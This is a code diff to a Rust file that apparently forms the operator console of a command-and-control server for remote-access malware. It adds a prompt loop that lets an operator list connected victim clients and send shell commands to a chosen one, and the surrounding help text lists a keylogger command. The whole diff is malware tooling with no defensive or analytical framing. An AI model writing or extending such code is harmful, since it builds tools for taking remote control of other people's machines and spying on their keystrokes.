@@ -1,4 +1,8 @@
-pub fn help() {
+use std::{io::{self, Write}, process};
+
+use crate::config::ClientManager;
+
+fn help() {
     let commands = r#"
 
 List of available Commands:
@@ -18,3 +22,59 @@ keylog_off                                      :    To close keylogger and self
 
     println!("{}", commands);
 }
+
+
+fn shell(ip: String, server_client_manager: &ClientManager){
+    println!("To exit the {} shell use 'exit' command", ip);
+    let mut cmd = String::new();
+    loop {
+        println!("C2 {} => ", ip);
+        io::stdout().flush().unwrap();
+
+        cmd.clear();
+        io::stdin().read_line(&mut cmd).unwrap();
+        cmd = cmd.trim_end().to_owned();
+        if cmd == "exit" {
+            break
+        }
+        server_client_manager.update_command(&ip, cmd.clone());
+        // func - execute command -> takes the command to execute, sends it to the client, and
+        // changes the command to None
+
+
+    }
+}
+
+
+pub fn commands(cmd: &String, server_client_manager: &ClientManager) {
+
+    if cmd == "help" {
+        help();
+    }
+
+    if cmd == "exit" {
+        println!("Entered the command Exit");
+        process::exit(0);
+    }
+
+    if cmd == "list-clients" || cmd == "lc" {
+        let client_list: Vec<String> = server_client_manager.list_clients();
+        println!("\nClients:");
+        for client in client_list {
+            println!("{}", client);
+        }
+    }
+
+    if cmd == "shell" {
+        println!("Which Client?(IP:PORT)");
+        let mut ip = String::new();
+        io::stdin().read_line(&mut ip).unwrap();
+        ip = ip.trim_end().to_owned();
+        if server_client_manager.client_exists(&ip) {
+            shell(ip, server_client_manager);
+        } else {
+            println!("Client {} does not exists", &ip);
+        }
+    }
+}
+
